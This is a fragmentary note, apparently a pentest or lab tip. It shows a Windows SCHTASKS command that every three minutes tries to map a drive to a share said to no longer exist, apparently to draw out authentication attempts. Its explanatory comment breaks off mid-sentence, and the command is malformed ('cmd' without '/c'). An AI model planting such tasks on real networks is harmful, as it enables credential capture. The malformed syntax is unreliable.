# create a scheduled task reaching out to an old share that doesnt erxist anymore every 3 minutes
# This will give us 
sc:\>SCHTASKS /Create /SC MINUTE /MO 3 /TN mydir /TR "cmd net use U: \\Sage300\The90s"